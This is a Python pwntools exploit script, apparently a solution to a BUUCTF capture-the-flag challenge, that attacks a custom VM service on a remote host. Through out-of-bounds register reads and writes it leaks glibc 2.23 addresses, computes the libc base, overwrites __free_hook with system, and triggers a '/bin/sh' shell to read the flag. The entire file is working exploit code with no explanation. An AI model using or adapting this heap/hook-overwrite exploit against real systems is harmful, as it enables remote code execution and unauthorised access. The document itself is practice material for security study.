from pwn import *
from zhilingji import *


def run():
    # p = process('./pwn')
    p = remote('node4.buuoj.cn', 25465)
    lib = ELF('/home/hututu/tools/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so')

    offset1 = lib.sym['stderr']
    offset2 = lib.sym['__free_hook'] - 0x8
    offset = offset2 - offset1
    print(offset)

    def send(code):
        p.sendline(str(code))

    send(0)
    send(1)
    send(116)
    send(MOV(25, 1))  # r1 = 25
    send(SUB(1, 2, 3))  # r3 = r2 - r1 = -25
    send(READ(3, 4))  # r4 = memory[-25] = memory[r3] -> free_hook_high
    send(MOV(26, 1))  # r1 = 26
    send(SUB(1, 2, 3))  # r3 = r2 - r1 = -26
    send(READ(3, 5))    # r5 = memory[-26] = memory[r3] -> stderr_low
    send(MOV(42, 1))  # r1 = 42
    [send(ADD(1, 5, 5)) for i in range(100)]
    send(MOV(56, 1))  # r1 = 56
    send(ADD(1, 5, 5))  # r5 -> free_hook_low

    send(MOV(7, 1))  # r1 = 7
    send(SUB(1, 2, 3))  # r3 = r2 - r1 = -7
    send(WRITE(3, 4))  # memory[r3] = r4 -> free_hook_high
    send(MOV(8, 1))  # r1 = 8
    send(SUB(1, 2, 3))  # r3 = r2 - r1 = -8
    send(WRITE(3, 5))  # memory[r3] = r5 -> free_hook_low
    send(QUIT())
    p.recvuntil(b'R4: ')
    addr1 = p.recv(4)
    p.recvuntil(b'R5: ')
    addr2 = p.recv(8)
    base_addr = int((addr1 + addr2), 16) + 8 - lib.sym['__free_hook']
    print(hex(base_addr))
    system_addr = base_addr + lib.sym['system']
    payload = b'/bin/sh\00' + p64(system_addr)
    p.sendline(payload)
    sleep(1)
    p.sendline(b'cat flag')
    p.interactive()


if __name__ == '__main__':
    run()
